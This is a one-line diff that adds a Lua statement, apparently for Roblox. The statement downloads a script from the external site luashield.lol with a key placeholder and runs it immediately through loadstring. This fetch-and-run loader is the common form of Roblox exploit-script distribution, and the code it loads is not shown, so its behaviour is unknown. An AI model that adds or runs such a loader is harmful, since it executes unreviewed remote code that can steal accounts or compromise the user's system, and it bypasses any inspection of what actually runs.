@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("http://luashield.lol/raw/b3987101028db074?key=YOUR_KEY"))()
